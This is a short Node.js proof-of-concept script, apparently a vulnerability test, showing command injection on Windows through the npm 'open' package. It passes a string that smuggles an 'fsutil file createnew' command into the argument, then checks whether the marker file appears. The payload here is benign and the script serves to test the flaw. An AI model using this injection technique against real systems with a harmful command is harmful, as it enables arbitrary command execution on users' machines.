const fs = require("fs");
const open = require("open");
const path = "./open";

try { if (fs.existsSync(path)) fs.unlinkSync(path); } catch {}

console.log("{ " + fs.existsSync(path) + ", false }");

// Working Windows injection payload
const payload = `" & fsutil file createnew open 0 & "`;

// Trigger injection
open(payload);

setTimeout(() => {
    const file_exist = fs.existsSync(path);
    console.log("{ " + file_exist + ", true }");

    if (file_exist) fs.unlinkSync(path);
    // done();
}, 300);
